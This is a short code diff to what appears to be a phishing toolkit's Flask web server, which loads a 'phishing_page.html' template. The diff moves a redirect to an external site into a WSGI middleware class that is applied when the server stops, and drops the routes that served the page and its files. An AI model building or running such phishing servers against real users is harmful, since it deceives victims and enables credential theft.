@@ -10,9 +10,19 @@ from . import Settings
 from selenium.webdriver.common.by import By
 import logging
 
+class RedirectMiddleware:
+    def __init__(self, app):
+        self.app = app
+
+    def __call__(self, environ, start_response):
+        if environ['PATH_INFO'] == '/':
+            start_response('302 Found', [('Location', 'http://fxp.co.il')])
+            return [b'Redirecting...']
+        return self.app(environ, start_response)
+
 class Server:
     def __init__(self, template_name="phishing_page.html", *args, **kwargs):
-        self.templates_dir = os.path.join(Settings.path,"core","templates")
+        self.templates_dir = os.path.join(Settings.path, "core", "templates")
         with open(os.path.join(self.templates_dir, template_name), 'r') as f:
             self.template_str = f.read()
         self.template_args = args
@@ -22,8 +32,6 @@ class Server:
         self.app = Flask(__name__, static_folder=os.path.join(Settings.path, "core", "www", self.name))
         self.srv = None
         self.thread = None
-        self.app.route('/')(self.serve)
-        self.app.route('/<path:filename>')(self.send_file)
 
         log = logging.getLogger('werkzeug')
         log.setLevel(logging.ERROR)
@@ -41,13 +49,9 @@ class Server:
 
     def stop_web_server(self):
         if self.srv is not None:
-            self.app.before_request(self.redirect_to_external)
+            self.app.wsgi_app = RedirectMiddleware(self.app.wsgi_app)
             self.srv.shutdown()
 
-    def redirect_to_external(self):
-        if request.path == '/':
-            return redirect('http://fxp.co.il')
-        return None
 
 
 class misc:
